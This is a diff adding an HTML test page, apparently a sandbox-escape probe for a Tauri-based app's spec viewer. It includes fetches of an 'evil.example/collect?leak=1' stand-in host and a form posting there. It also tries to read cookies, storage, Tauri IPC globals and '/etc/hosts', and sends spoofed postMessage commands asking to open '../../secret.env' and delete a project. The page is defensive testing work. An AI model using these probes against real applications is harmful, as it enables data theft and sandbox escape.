@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Tries to move the frame elsewhere after a second; the viewer takes this out. -->
+  <meta http-equiv="refresh" content="1;url=about:blank#refreshed">
+  <!-- Tries to make every relative address resolve somewhere of its own. -->
+  <base href="https://evil.example/">
+  <title>Evil HTML — SPEC</title>
+  <link rel="stylesheet" href="../assets/spec-styles.css">
+  <!-- Files of the folder that are no assets of it, asked for as if they were: never read. -->
+  <link rel="stylesheet" href="../registry.md">
+  <script src="../evil/SPEC.md"></script>
+  <style>
+    body { font: 13px/1.5 ui-monospace, Menlo, monospace; padding: 16px; }
+    #probes { white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+<h1>Evil HTML</h1>
+<p>Each line below is one thing this spec tries against ConsensFlow. PASS means it failed at it; FAIL
+  means it reached something. SENT lines are messages to the page, which must act on none of them.</p>
+<pre id="probes"></pre>
+<form id="away" action="https://evil.example/collect" method="get" target="_top"><input name="q" value="leak"></form>
+<script>
+  const probes = document.getElementById('probes')
+  const say = (line) => {
+    probes.textContent += `${line}\n`
+  }
+  // What the frame's policy refused, said at the end: the proof a PASS was the policy's.
+  const refused = []
+  document.addEventListener('securitypolicyviolation', (event) => {
+    refused.push(`${event.effectiveDirective} ${event.blockedURI}`)
+  })
+  const blocked = (what, attempt) => {
+    try {
+      const got = attempt()
+      say(got === undefined || got === null ? `PASS ${what}: nothing there` : `FAIL ${what}: ${String(got).slice(0, 80)}`)
+    } catch (error) {
+      say(`PASS ${what}: ${error.name}`)
+    }
+  }
+  const unreached = async (what, attempt) => {
+    try {
+      const answer = await attempt()
+      say(`FAIL ${what}: answered ${answer.status}`)
+    } catch (error) {
+      say(`PASS ${what}: ${error.name}`)
+    }
+  }
+  const unloaded = (what, src) =>
+    new Promise((done) => {
+      const image = new Image()
+      image.onload = () => {
+        say(`FAIL ${what}: loaded`)
+        done()
+      }
+      image.onerror = () => {
+        say(`PASS ${what}: not loaded`)
+        done()
+      }
+      image.src = src
+      setTimeout(() => {
+        say(`PASS ${what}: never answered`)
+        done()
+      }, 1500)
+    })
+
+  async function run() {
+    say(`INFO address: ${location.href}`)
+    say(`INFO base: ${document.baseURI}`)
+    say(`INFO origin: ${self.origin}`)
+    say(
+      location.href.includes('token') || document.referrer.includes('token')
+        ? 'FAIL the address carries a token'
+        : 'PASS the address carries no token',
+    )
+    say(document.baseURI.includes('evil.example') ? 'FAIL the spec chose its base' : 'PASS the spec could not choose its base')
+    blocked("parent's document", () => parent.document.title)
+    blocked("top's document", () => top.document.title)
+    blocked("parent's globals", () => parent.__TAURI__)
+    blocked('__TAURI_INTERNALS__ here', () => window.__TAURI_INTERNALS__)
+    blocked('__TAURI__ here', () => window.__TAURI__)
+    blocked('isTauri here', () => window.isTauri)
+    blocked('the IPC handler here', () => window.ipc ?? window.webkit?.messageHandlers?.ipc)
+    blocked('cookies', () => document.cookie || null)
+    blocked('local storage', () => localStorage.length)
+    await unreached('fetch of its own address', () => fetch(location.href))
+    await unreached('fetch of its base', () => fetch(new URL('index.html', document.baseURI)))
+    await unreached('fetch of the page', () => fetch('/index.html'))
+    await unreached('fetch of the daemon with its own address', () =>
+      fetch(`http://127.0.0.1:${location.port || 80}/api/project?${new URLSearchParams(location.search)}`),
+    )
+    await unreached('fetch of the daemon on localhost', () => fetch('http://localhost:4318/?token=guess'))
+    await unreached('fetch of tauri://', () => fetch('tauri://localhost/index.html'))
+    await unreached('fetch of the IPC', () => fetch('ipc://localhost/daemon_request', { method: 'POST', body: '{}' }))
+    await unreached('fetch of the network', () => fetch('https://evil.example/collect?leak=1'))
+    await unloaded('an image from asset://', 'asset://localhost/etc/hosts')
+    await unloaded('an image from tauri://', 'tauri://localhost/brand/icon.png')
+    await unloaded('an image from the network', 'https://evil.example/pixel.png')
+    blocked('a window opened', () => window.open('https://evil.example/popup'))
+    // Refused either by an error or in silence: the page, which stays where it is, is the proof.
+    try {
+      top.location.href = 'https://evil.example/top'
+      say('ASKED the top window to move: the page must not have moved')
+    } catch (error) {
+      say(`PASS the top window moved: ${error.name}`)
+    }
+    blocked('a form sent to the top window', () => {
+      document.getElementById('away').submit()
+      return null
+    })
+    for (const message of [
+      'consensflow:close',
+      'consensflow:refresh-agents',
+      { type: 'specs:open', path: '../../secret.env' },
+      { operation: 'project.delete', body: { project: 1 } },
+    ]) {
+      parent.postMessage(message, '*')
+      top.postMessage(message, '*')
+      say(`SENT ${JSON.stringify(message)}`)
+    }
+    await new Promise((later) => setTimeout(later, 200))
+    for (const line of refused) say(`POLICY ${line}`)
+    document.body.dataset.done = 'true'
+    say('DONE')
+  }
+  void run()
+</script>
+</body>
+</html>
